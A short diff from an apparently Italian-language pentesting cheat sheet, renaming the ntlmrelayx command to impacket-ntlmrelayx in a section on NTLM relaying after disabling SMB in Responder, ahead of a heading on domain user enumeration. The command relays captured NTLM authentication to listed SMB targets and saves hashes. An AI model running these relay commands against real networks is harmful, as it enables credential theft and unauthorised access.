@@ -68,7 +68,7 @@ sudo sed -i 's/SMB = On/SMB = Off/g' /etc/responder/Responder.conf && cat /etc/r
 ```
 Poi si starta ntlmrelayx
 ```bash
-ntlmrelayx -tf smb_targets.txt -of netntlm -smb2support -socks
+impacket-ntlmrelayx -tf smb_targets.txt -of netntlm -smb2support -socks
 ```
 ### **USER ENUM(W\ CREDS)**
 Per ottenere tutti gli User di un dominio avendo un account a disposizione
